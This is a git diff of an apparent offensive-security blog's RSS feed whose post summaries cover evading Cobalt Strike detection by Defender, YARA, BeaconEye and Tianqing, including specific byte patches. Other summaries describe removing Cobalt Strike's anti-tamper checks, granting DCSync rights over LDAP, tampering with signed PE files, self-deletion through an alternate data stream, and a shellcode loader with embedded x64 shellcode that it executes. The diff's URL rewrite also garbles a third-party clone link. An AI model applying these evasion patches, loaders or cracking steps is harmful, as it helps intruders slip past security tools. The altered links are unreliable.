@@ -2,164 +2,164 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on 2867a0</title>
-    <link>https://github.com/2867a0/posts/</link>
+    <link>https://2867a0.github.io//2867a0/posts/</link>
     <description>Recent content in Posts on 2867a0</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <lastBuildDate>Fri, 10 Nov 2023 08:18:00 +0800</lastBuildDate>
-    <atom:link href="https://github.com/2867a0/posts/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://2867a0.github.io//2867a0/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>cobalt strike 天擎特征</title>
-      <link>https://github.com/2867a0/posts/2023/cobalt_strike_%E5%A4%A9%E6%93%8E%E7%89%B9%E5%BE%81/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_%E5%A4%A9%E6%93%8E%E7%89%B9%E5%BE%81/</link>
       <pubDate>Fri, 10 Nov 2023 08:18:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/cobalt_strike_%E5%A4%A9%E6%93%8E%E7%89%B9%E5%BE%81/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_%E5%A4%A9%E6%93%8E%E7%89%B9%E5%BE%81/</guid>
       <description>特征1-上线特征 48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 45 33 DB 45 33 D2 33 FF 33 F6 48 8B E9 BB 03 00 00 00 85 D2 0F 84 81 00 00 00 0F B6 45 检测(baes64_decode 函数)&#xA;48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 45 33 DB 45 33 D2 33 FF 33 F6 48 8B E9 BB 03 00 00 00 85 D2 0F 84 81 00 00 00 bypass</description>
     </item>
     <item>
       <title>cobalt strike Yara规则绕过</title>
-      <link>https://github.com/2867a0/posts/2023/cobalt_strike_yara%E8%A7%84%E5%88%99%E7%BB%95%E8%BF%87/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_yara%E8%A7%84%E5%88%99%E7%BB%95%E8%BF%87/</link>
       <pubDate>Wed, 01 Nov 2023 08:18:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/cobalt_strike_yara%E8%A7%84%E5%88%99%E7%BB%95%E8%BF%87/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_yara%E8%A7%84%E5%88%99%E7%BB%95%E8%BF%87/</guid>
       <description>yara规则绕过 yara规则&#xA;将解密后的beacon.dll用yara扫描能找到特征&#xA;![2.png(/images/2023/cobalt_strike_Yara规则绕过/2.png)&#xA;用010edit改一下代码就能绕过，其他同理</description>
     </item>
     <item>
       <title>cobalt strike BeaconEye绕过</title>
-      <link>https://github.com/2867a0/posts/2023/cobalt_strike_beaconeye%E7%BB%95%E8%BF%87/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_beaconeye%E7%BB%95%E8%BF%87/</link>
       <pubDate>Mon, 30 Oct 2023 08:18:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/cobalt_strike_beaconeye%E7%BB%95%E8%BF%87/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_beaconeye%E7%BB%95%E8%BF%87/</guid>
       <description>BeaconEye绕过 BeaconEye中对cobalt strike内存的检测逻辑如下，检测的是内存中profile的配置信息。&#xA;cs源码分析profile构成方式。在服务端创建一个Listener之后会处理beacon、profile和sleepmask。首先进入到Common.ScListener#export()函数中。&#xA;一直跟到src.Beacon.BeaconPayload#exportBeaconStage()函数中的Settings结构，这个结构体保存了profile处理后的格式。在415行创建了Settings结构体后，读取配置信息并按照一定的格式写入结构体&#xA;跟进addShort()，多次调用了this.patch.addShort()写入key和value，写入后的数据先保存在this.patch.out.buf，写入对应的位置如下。addShort()会在写入key和value值的中间插入两个字节的1、2&#xA;第二次调用addShort()函数写入后buf中的结果&#xA;addInt()函数，这一回value的占用大小为4个字节。&#xA;继续往下，添加pivot、killDate、进程注入的配置，接着会填充4096个随机字节在配置的末尾，处理完这些后会对profile配置做一次异或加密。函数中94就是加密密钥。这里已经将默认的修改掉了。&#xA;将加密前后的profile配置信息导出到文件分析，和BeaconEye的扫描规则并不匹配，BeaconEye中开头有16个字节的0&#xA;在函数最后return的数据是将profile写入到beacon后的字节数据，将其也导出&#xA;逆向分析导出的BeaconDll，在写本文之前已经分析过一遍了，所以后面就用分析后的dll代码进行记录。&#xA;DllMain会进入process_profile_config函数中，这个函数是处理profile逻辑函数&#xA;跟进，函数会先创建一块新的内存空间并将句柄保存在profile_mem_addr变量中，之后将空间内容全部重置为6（原来是0，这里已经改成了6），向下进入for循环xor解密profile配置信息，如下图。&#xA;解密之后完成之后，会保存解密后的内存地址和大小到变量profile_decode_ptr中。然后执行下一个for循环，&#xA;在这个for循环中，首先调用readShort函数将结果返回给变量j，接着再执行for循环内的逻辑。函数readShort逻辑如下，首先会做一个if判断，然后调用ntohs函数读取两个字节，对应的正好是服务端代码中的addShort()函数的逻辑，读取完成后当前读取的指针地址+2，未读取内存空间大小-2，返回读取的结果。&#xA;在for循环语句体内，首先判断第一个readShort读取的数据是否为0，是则退出循环，不为0则继续读取两个字节赋值给变量data_type，第三次读取赋值给变量data_size（变量的含义是根据下面代码中switch对数据的使用得出的），之后计算一次地址偏移，第一次的offset根据动态调试发现是8，这也就对应上了BeaconEye为什么前面会有一堆0的检测，只要我将上面的memset重置的内存设置为非0就能绕过BeaconEye的规则了。&#xA;回到IDA，计算完偏移后将变量data_type的值写入到偏移指定的地址，(第一次写入的是数据类型)，往下进入switch循环，对data_type的值进行判断如果是1则再次读取两个字节并写入到内存空间，是2则读取4个字节并写入，3则是string类型，sub_10006C81传入了数据大小data_size。&#xA;分析到这里就明白了，cobalt strike只会将profile中的数据类型和数据内容写入到内存，并且保存profile处理后的内存空间中前8个数据为0，这时候beaconeye扫描是能扫描到的，绕过方法就是在其memset的时候将其替换为非0</description>
     </item>
     <item>
       <title>cobalt strike Defender绕过</title>
-      <link>https://github.com/2867a0/posts/2023/cobalt_strike_defender%E7%BB%95%E8%BF%87/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_defender%E7%BB%95%E8%BF%87/</link>
       <pubDate>Wed, 25 Oct 2023 08:18:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/cobalt_strike_defender%E7%BB%95%E8%BF%87/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_defender%E7%BB%95%E8%BF%87/</guid>
       <description>解析Defender VDM特征库 网上有相关的VMD解密文章&#xA;根据上面的研究，又有解析各种字段的文章和工具，工具可以将上面的extracted文件进一步解析成csv格式的文件。现在能清楚Defender查了cs哪一段特征，当然不只是cs，其他工具特征也一样能看。&#xA;Windows Defender 数据库结构分析（上）&#xA;Windows Defender 数据库结构分析（下）&#xA;同时，BRC4的作者在Twitter上分享了一份内存特征定位的代码&#xA;其他的，微步发布了关于defender内存调试的文章&#xA;Defender针对CS的查杀点 生成beaconx64.exe，用Virtest探测，结果如下&#xA;文件 报毒 特征 beaconx64.exe VirTool:Win64/CobaltStrike.G 00044C3D -&amp;gt; 76 65 72 00 00 artifact64.exe CobaltStrike.MBK!MTB 00000970 -&amp;gt; 7C E9 48 89 D9 CobaltStrike.G 这个特征是命名管道的字符串特征，修改一下就可以了。&#xA;特征文件位于源码中的resources文件夹中，artifact* 相关文件。该文件夹中的内容不需要反编译&#xA;要注意的是resources文件夹不要放在src目录中，继续放在decompiled_src目录中。因为可能会找不到bof而导致beacon用不了bof扩展。&#xA;CobaltStrike.MBK!MTB 在IDA中查找字节码，发现对应的反汇编内容是for循环。&#xA;逆向分析一下在for循环之前，程序都在做什么，首先找到main函数入口。看到在main函数中有两个函数和一个while循环，这个循环只做睡眠用。&#xA;进入sub_401795()，在该函数内调用了GetTickCount()函数获取当前时间，还有一堆硬编码的字符，解密过来是.\pipe\，然后将硬编码的字符通过sprintf()函数写入到Buffer变量中，用x64DBG动态调试这段代码，能看到拼接后的命名管道为\\.\pipe\MSSE-9301-revres&#xA;继续看CreateThread这个函数干了什么，IDA跟进后能看到调用了CreateNamedPipeA()函数，管道名称就是刚才拼接的管道名称\\.\pipe\MSSE-9301-revres，之后如果有数据则调用WriteFile()将数据写入管道内并关闭管道，所以这里是创建了一个新线程并初始化了命名管道。&#xA;再来看下创建线程之后调用的函数sub_401742()内的逻辑，首先是分配了一块内存空间，然后执行do ... while循环，一直到while里面的函数返回为true时停止，跟进这个函数&#xA;这个函数的逻辑也很清晰，从命名管道中读取数据，当读取到数据的时候返回true&#xA;继续看do ... while() 之后的逻辑，跟进函数，分配一块内存空间，for循环异或解密命名管道内的数据，修改内存空间属性为RX并创建新线程执行这块内存空间。&#xA;到这里就明白了，Defender查杀的是这个for循环的逻辑，绕过方法直接把jl改成jb，也就是7C E9 -&amp;gt; 72 E9&#xA;涉及的文件为resources文件夹内的artifact64*相关文件。&#xA;Behavior:Win32/CobaltStrike.B!nri 生成x64 https Stageless可执行文件分析&#xA;调试程序，在发起https连接请求时会触发报毒，第一次http请求可以用内存加载的方式绕过，后续注入依然会触发该特征&#xA;这个特征可以用Hook HttpQueryInfo()可解决</description>
     </item>
     <item>
       <title>cobalt strike 特征修改</title>
-      <link>https://github.com/2867a0/posts/2023/cobalt_strike_%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/</link>
       <pubDate>Thu, 12 Oct 2023 08:18:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/cobalt_strike_%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/</guid>
-      <description>JA3特征修改 JA3指纹识别工具，可以在censys里面找对应指纹的C2&#xA;git clone https://github.com/salesforce/jarm.git cd jarm pip3 install -r requirements.txt python3 jarm.py IP/DOMAIN -p 443 services.jarm.fingerprint: xxx 解密sleeve里面的dll文件 找到密钥&#xA;解密，解密后的文件存放在cs45Resource\Decode\sleeve文件夹内&#xA;javac -encoding UTF-8 -classpath cs_2867a0.jar CrackSleeve.java java -classpath cs_2867a0.jar;./ CrackSleeve decode # 加密 java -classpath cs_2867a0.jar;./ CrackSleeve encode f38eb3d1a335b252b58bc2acde81b542 </description>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9/</guid>
+      <description>JA3特征修改 JA3指纹识别工具，可以在censys里面找对应指纹的C2&#xA;git clone https://2867a0.github.io//salesforce/jarm.git cd jarm pip3 install -r requirements.txt python3 jarm.py IP/DOMAIN -p 443 services.jarm.fingerprint: xxx 解密sleeve里面的dll文件 找到密钥&#xA;解密，解密后的文件存放在cs45Resource\Decode\sleeve文件夹内&#xA;javac -encoding UTF-8 -classpath cs_2867a0.jar CrackSleeve.java java -classpath cs_2867a0.jar;./ CrackSleeve decode # 加密 java -classpath cs_2867a0.jar;./ CrackSleeve encode f38eb3d1a335b252b58bc2acde81b542 </description>
     </item>
     <item>
       <title>cobalt strike 二开环境部署</title>
-      <link>https://github.com/2867a0/posts/2023/cobalt_strike_%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</link>
       <pubDate>Sun, 08 Oct 2023 08:18:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/cobalt_strike_%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/cobalt_strike_%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</guid>
       <description>前期准备 IDEA 2022.1 java 11 cobalt strike 4.5 反编译 IDEA自带反编译软件，在idea目录的plugins\java-decompiler\lib\java-decompiler&#xA;在该jar文件同级目录创建src、bin文件夹，将cobalt strike服务器jar包放到bin目录中，执行如下代码，反编译后的源码在src目录中。&#xA;java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dsg=true bin/cobaltstrike.jar src 项目创建 创建lib目录，里面存放cobaltstrike.jar包&#xA;创建decompiled_src目录，路面存放反编译后的源码&#xA;将decompiled_src目录中的aggressor移动到src目录中。&#xA;项目结构 -&amp;gt; 模块 -&amp;gt; 依赖 -&amp;gt; + -&amp;gt; 库 -&amp;gt; java中将cs jar包导入&#xA;配置工件&#xA;将反编译文件夹里面的MANIFEST.MF文件夹内容复制到src对应的文件，之后可以删除decompiler里面的META-INF&#xA;Javaagent暗桩去除 直接全局搜索-javaagent:，将检测代码都注释掉，完成后重新编译&#xA;如果修改完成后beacon上线报错，则是去除暗桩的时候出了问题。保险起见是删除while循环的相关逻辑&#xA;去除screenshot暗桩 位于beacon.BeaconC2#A()函数中，如果存在javaagent就会进入下面框出来的部分，导致screenshot返回一直报错。正确的分支是进入934行的代码。&#xA;源码调试Teamserver teamserver 在server/TeamServer.java，先随便启动一下让IDEA生成默认配置，之后修改配置，将teamserver启动文件中vm选项填入diea启动配置的vm选项中，将启动参数填入程序实参</description>
     </item>
     <item>
       <title>GoLdapTool工具开发篇-2: SDDL修改</title>
-      <link>https://github.com/2867a0/posts/2023/sddl_2/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/sddl_2/</link>
       <pubDate>Sat, 22 Jul 2023 23:09:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/sddl_2/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/sddl_2/</guid>
       <description>SDDL修改 能解析就能修改，线索&#xA;在官方issues中提到Dacl修改的步骤。在impacket中有没有相关库呢，example文件夹中ldap-shell下的do_write_gpo_dacl有相关实现，代码如下，查询了Dacl后创建新的ace条目，将其添加到Dacl的数据末尾，之后执行修改操作。既然python可以，那么golang也可以。&#xA;​&#xA;修改 在golang中，我们也可以按照python的逻辑：&#xA;查询Dacl 创建Ace条目，将Ace添加到Dacl中 更新数据偏移 修改 相关代码我已经实现了。首先是查询域控的SDDL属性，按照上一节所述的格式解析之后，创建一个新的Ace条目，逻辑如下图函数所示。首先创建一个Ace结构体，（这里是硬编码）填充相关结构，设置Ace的扩展为ObjectType，SID和ObjectType是可以指定的。&#xA;209行aceEntry.Update()是将数据转换为字节结构保存，是为了后续转换为原始数据准备。&#xA;215行将ace条目写入到Dacl中的Ace数组中。之后要记得更新Dacl中的AceCount、AclSize。dacl.update()也是更新了Dacl的原始数据。&#xA;​&#xA;Dacl的数据更新完毕后还要更新SrSecurityDescriptor中的OffsetOwner和OffsetGroup，更新大小为我们添加的Ace的大小偏移+原来的偏移大小&#xA;​&#xA;最后，将修改完毕的数据转换为字节，并调用ldap的修改方法进行修改。&#xA;​&#xA;效果 先查询域控中哪些用户具有DCSync权限，如下图，存在用户john。&#xA;​&#xA;之后，我们再添加一个用户jim，脚本提示添加完成。&#xA;​&#xA;再次查询，jim用户具有DCSync权限&#xA;​</description>
     </item>
     <item>
       <title>不破坏签名并修改签名文件</title>
-      <link>https://github.com/2867a0/posts/2023/modify_signature_hash/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/modify_signature_hash/</link>
       <pubDate>Sat, 22 Jul 2023 23:09:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/modify_signature_hash/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/modify_signature_hash/</guid>
       <description>PE文件中，生成签名的时候会有一部分不参与签名hash计算，我们可以修改这部分而不破坏签名校验&#xA;下图中粗体的部分，就是签名的相关内容。灰色背景的部分，不参与签名的hash计算。&#xA;证书表偏移位于数据目录中第5个结构，VirtualAddress是文件偏移，Size是证书表的大小&#xA;按照偏移找到证书表开头，证书表前几个字节是一个WIN_CERTIFICATE结构体，其中前4个字节为证书的大小。每一个证书信息都需要按照8字节进行对齐&#xA;下图中，最后两个字节是填充字节00，手动修改这一部分进行验证。&#xA;签名正常&#xA;追加字节，需要修改DataDirArray[4].Size、证书大小&#xA;26744-&amp;gt;26752&#xA;0x6878 -&amp;gt; 0x6880&#xA;修改完成，签名正常&#xA;代码实现 C++版本的SigFlip可以自动添加shellcode到签名文件中。&#xA;也有golang版本的，在此基础上进行了修改，只有修改签名驱动的hash功能&#xA;修改的工具会在驱动的末尾添加 kfcvme50 的字符串</description>
     </item>
     <item>
       <title>GoLdapTool工具开发篇-1: SDDL解析</title>
-      <link>https://github.com/2867a0/posts/2023/sddl_1/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/sddl_1/</link>
       <pubDate>Sun, 16 Jul 2023 07:16:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/sddl_1/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/sddl_1/</guid>
       <description>python编写的ldap查询工具不能编译，不方便在windows主机上使用，于是想着用golang去重构。golang有ldap v3库，可以满足基本的查询需求。但是，该库没有实现SDDL的解析。在其issues中有提到相关的解析文章，可以自己实现。&#xA;解析 要解析SDDL数据，需要先获取一段原始数据，做如下查询并将nTSecurityDescriptor​的原始数据打印出来，如下图。&#xA;​&#xA;整个SDDL结构分为NtSecurityDescriptor头​+Sacl头​+Sacl Ace条目​+Dacl头​+Dacl Ace条目​&#xA;后续的解析都以我在编写该文章之前的数据进行解析&#xA;​&#xA;NtSecurityDescriptor header 根据微软官方​[MS-DTYP]: 2.4.6的描述，该部分是一个SECURITY_DESCRIPTOR​结构，有如下字段。其中，Revision​、Sbz1​、Control​、OffsetOwner​、OffsetGroup​、OffsetSacl​、OffsetDacl​这几个字段总共占20个字节。&#xA;OffsetOwner​和OffsetGroup​是所有者、所在组的数据偏移，OffsetSacl​和OffsetDacl​是Sacl header、Dacl header数据的偏移地址。根据这些偏移找到对应的数据并将数据解析赋值给变量OwnerSid​、GroupSid​、Sacl​、Dacl​&#xA;​​&#xA;上述结构对应我们Dump出来的数据如下图。我们主要关心的是其偏移大小。​OffsetOwner​占4个字节，为C0 08 00 00​，按照小端解析为00 00 08 C0​，转换为10进制值为2240​。OffsetGroup​同理。&#xA;OffsetSacl​的数据为14 00 00 00​，转换为10进制后是20​，也就是说，NtSecurityDescriptor header​之后紧跟着Sacl header​（偏移的起始地址为NtSecurityDescriptor header​的第一个字节）。&#xA;OffsetDacl​的数据为8C 00 00 00​，按照小端排序为00 00 00 8C​，转换为10进制之后是0x8C=140​&#xA;​​&#xA;NtSecurityDescriptor header​的数据就解析完了，紧跟着的是Sacl header​&#xA;Sacl 解析 Sacl​这一部分的数据包含Sacl header​ 和多个 Sacl Ace​条目。&#xA;根据微软MS-DTYP: 2.4.5中的描述，Acl​结构总共8个字节，我们需要关心的是AclSize​和AceCount​这两个字段，顾名思义，一个是Sacl​数据的大小，一个是Sacl Ace​的条目数量。&#xA;​​&#xA;我们找到原始数据中对应的字节数，如下图，就是Sacl header​&#xA;​​&#xA;这是解析之后的。​Acl Size​字段数据为78 00​，转换后的10进制值为120​。这个大小是Sacl header​的大小 + 所有Sacl Ace​的大小&#xA;Ace Count​的值为2，也就是说Sacl有两条Ace&#xA;​​&#xA;Sacl header​之后紧跟着的是其对应的Ace数据。&#xA;先来看Ace数据结构，在微软的文档只将AceType​、AceFlags​、AceSize​作为Ace Header​的字段，而我这里是将AceMask​、Extended​、SID​都放在了AceStruct​中进行解析。</description>
     </item>
     <item>
       <title>利用ADS删除自身</title>
-      <link>https://github.com/2867a0/posts/2023/adsdeleteself/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/adsdeleteself/</link>
       <pubDate>Sun, 11 Jun 2023 08:18:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/adsdeleteself/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/adsdeleteself/</guid>
       <description>ADS Microsoft于90年代初期引入了一种称为“数据流”的概念，从而使NTFS可以作为Macintosh客户端访问文件服务器的文件系统。因为Mac OS 是利用Mac的分层式文件系统（HFS)上所谓的资源分支数据流，用于存放图标等应用程序的元数据。NTFS和FAT的差别就是FAT由一个数据流构成，而NTFS可以在一个文件内存里面存储多个数据流。&#xA;在windows协议MS-FSA中ADS的定义：一个被命名的数据流是一个文件或者目录的一部分，它们可以独立于默认数据流被单独的打开。许多数据流的操作之影响数据流并不影响其他数据流，文件和目录&#xA;所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：&#xA;&amp;lt;文件名&amp;gt;:&amp;lt;流名&amp;gt;:&amp;lt;流种类&amp;gt; 文件ADS默认没有流名字，一个文件test.txt在NTFS中的全名为test.txt::$DATA&#xA;文件夹没有默认的数据流（也就是没有主数据流），但是有一个默认的目录流为$INDEX_ALLOCATION，默认的流名为$I30。比如文件夹testDir全名为testDir:$I30:$INDEX_ALLOCATION&#xA;假设查看文件1.txt的数据流内容，可以输入如下命令，其内容和1.txt是一样的，在数据流中添加的内容保存后会被写入对应的文件中。如下图，原来1.txt中只有内容1.txt，在数据流中写入2，保存后重新打开原文件，发现2被写入&#xA;notepad.exe 1.txt::$DATA 简单提一下，用微软的streams.exe工具可以遍历出程序的备用数据流&#xA;自删除 自删除原理是，将文件重命名为数据流格式，然后删除该数据流。利用这种方法去删除可以无视当前文件句柄占用，如果程序处于运行中也不会破坏程序的运行。&#xA;代码如下，首先以DELETE方式获取自身文件句柄，调用SetFileInformationByHandle()将文件名修改为:anyany，以调试编译运行的时候SetFileInformationByHandle()函数会报错，忽略就行。&#xA;修改完成后重新打开一次文件句柄，再次调用SetFileInformationByHandle()删除文件&#xA;程序执行，自删除文件，后续的代码依旧可以运行&#xA;上面的代码中我设置了两个暂停，第一个pause中，如果以代码调试的方式打开程序，CreateFileW函数会获取不到文件句柄，解决方法也简单，x64gbd附加到进程就可以调试了。&#xA;第二个pause是在将文件修改为数据流之后，用winhex创建磁盘快照可以发现，原来的程序变成了0B，进入程序之后any文件其实就是原来的程序&#xA;从上面可以看出，我们在第一次rename的时候是将程序移动到了数据流中（磁盘中会有一个0B的文件），第二次删除的时候删除的0B文件是我们的数据流文件。&#xA;这里还有一个点，在第一次rename文件之后如果不关闭程序的句柄（也就是一直暂停到第二个pause），火绒剑操作这个文件的时候会卡死&#xA;完整代码 CloseSelf.h&#xA;#pragma once #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;shlwapi.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define DS_STREAM_RENAME L&amp;#34;:anyany:$DATA&amp;#34; #define DS_DEBUG_LOG(msg) wprintf(L&amp;#34;[LOG] - %s\n&amp;#34;, msg) BOOL ds_deposite_handle(HANDLE hHandle); BOOL ds_rename_handle(HANDLE hHandle); HANDLE ds_open_handle(PWCHAR pwPath); CloseSelf.cpp&#xA;#include &amp;#34;CloseSelf.h&amp;#34; HANDLE ds_open_handle(PWCHAR pwPath) { return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); } BOOL ds_rename_handle(HANDLE hHandle) { FILE_RENAME_INFO fRename; RtlSecureZeroMemory(&amp;amp;fRename, sizeof(fRename)); // set our FileNameLength and FileName to DS_STREAM_RENAME LPWSTR lpwStream = (LPWSTR)DS_STREAM_RENAME; fRename.</description>
     </item>
     <item>
       <title>Write Memory Trick</title>
-      <link>https://github.com/2867a0/posts/2023/writememorytrick/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/writememorytrick/</link>
       <pubDate>Wed, 22 Mar 2023 07:12:30 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/writememorytrick/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/writememorytrick/</guid>
       <description>[TOC]&#xA;vx-underground档案中记载的技巧，用一些非常见的函数写入shellcode到内存。原文来自xss.is论坛，这里只记录复现出来的函数。&#xA;PathCanonicalizeA 源代码如下，首先HeapCreate()、HeapAlloc()分配dst_shellcode内存空间，使用PathCanonicalizeA()函数将源shellcode逐字节复制到dst_shellcode，修改dst_shellcode内存空间权限为RWX，最后调用**InitOnceExecuteOnce()**执行。&#xA;PathCanonicalizeA函数在使用的时候有两个问题，一是遇到0x00字符时终止，二是长度不能过长。所以需要确保源shellcode不能有坏字符，同时shellcode长度不能过长。代码里面是将源shellcode先写到数组，再将数组内容复制到dst_shellcode内存空间。&#xA;#include &amp;lt;Windows.h&amp;gt; #include &amp;lt;Shlwapi.h&amp;gt; #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) bool test1() { // x64 calc.exe shellcode // https://www.exploit-db.com/shellcodes/49819 unsigned char orig_shellcode[] = &amp;#34;\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b&amp;#34; &amp;#34;\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2&amp;#34; &amp;#34;\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b&amp;#34; &amp;#34;\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04&amp;#34; &amp;#34;\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0&amp;#34; &amp;#34;\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2&amp;#34; &amp;#34;\x48\x83\xec\x20\x41\xff\xd6&amp;#34;; size_t ori_shellcode_size = sizeof orig_shellcode; LPVOID copied_shellcode = NULL; HANDLE heap = NULL; BOOL ret = 0; int size = 0; heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); copied_shellcode = HeapAlloc(heap, 0, ori_shellcode_size); ZeroMemory(copied_shellcode, ori_shellcode_size); // copy shellcode for (size_t i = 0; i &amp;lt; ori_shellcode_size; i++) { char temp[2] = { 0 }; temp[0] = orig_shellcode[i]; if (!</description>
     </item>
     <item>
       <title>Pe To Shellcode</title>
-      <link>https://github.com/2867a0/posts/2023/petoshellcode/</link>
+      <link>https://2867a0.github.io//2867a0/posts/2023/petoshellcode/</link>
       <pubDate>Fri, 03 Mar 2023 08:00:00 +0800</pubDate>
-      <guid>https://github.com/2867a0/posts/2023/petoshellcode/</guid>
+      <guid>https://2867a0.github.io//2867a0/posts/2023/petoshellcode/</guid>
       <description>原项目地址&#xA;pe2shc 先把它转成vs项目，程序入口接受两个参数，待转换文件和转换后文件输出路径&#xA;首先执行的是is_supported_pe()函数。读取源文件，按照内存对齐方式将数据读取到内存，判断是否为可以转换的程序&#xA;存在重定位表 不支持.NET程序 检查完成之后释放申请的内存空间，重新申请一块新的内存空间并内存对齐方式读取到内存，shellcodify()函数就是真正要转换的逻辑&#xA;函数先从资源区读取stub代码，这个代码就是stub64.bin中的代码。再申请一块新的内存空间（就叫他扩展内存空间），将展开后的PE和stub代码都放到扩展内存空间中，stub代码会被放在PE数据的末尾。接着执行overwrite_hdr()函数。&#xA;overwrite_hdr()会修改扩展空间前32个字节，也就是源文件DoS头的前32字节。 下图中00 16 60 00转换为10进制是1466368，是源程序内存展开后的大小，将这个数值写入redir_code，程序在执行到这里会跳转到(源程序内存展开后的首地址 + 1466368)地址，也就跳到了stub代码区&#xA;目前，我们的源程序以内存对齐方式被读取在扩展空间，源程序的DoS头被修改（跳转到stub代码），stub代码被存放在程序的末尾。&#xA;源代码中，到这里就开始执行保存逻辑了。在保存之前：&#xA;判断程序是否需要修复导入表（这里用的是mimikatz作为源程序，没做导入表的修复） 修改节表中文件对齐地址为内存对齐后的地址 最后将内存中的数据保存到文件。因为节区块是按照内存对齐进行保存的，又有stub代码附加到了源程序的末尾，新生成的程序会比源程序大不少&#xA;stub 代码 附加到文件末尾的二进制代码是stub64.bin，它的源代码是loader_v2项目编译生成的。&#xA;将stub64.bin拖到IDA里面配合loader_v2源代码分析，stub_main()函数就是程序跳转后要执行的第一个函数，首先初始化需要的函数地址，从PEB表里面拿到kernel32的地址，从kernel32中遍历出LoadLibraryA、GetProcAddress函数的地址&#xA;然后判断参数1指向的地址能否被解析成PE结构，v4参数取的是DoS头中的第32个字节，在DoS头里面一般是0，所以主要看case 0的逻辑。&#xA;NT头+176指向的是BaseRelocationTable的首地址，确保重定位表存在。 修复重定位表，修复导入表，修复TLS表&#xA;最后，找到程序的AddressOfEntryPoint，判断是DLL还是exe执行&#xA;总体来说这个项目用到的还是PE结构的相关知识，和PE内存加载的逻辑很相似。利用这个项目转换出来的程序既可双击执行，也可以直接扔到内存中加载</description>
     </item>
     <item>
       <title>Big Stack bypass</title>
-      <link>https://github.com/2867a0/posts/2023/bigstack/</link>
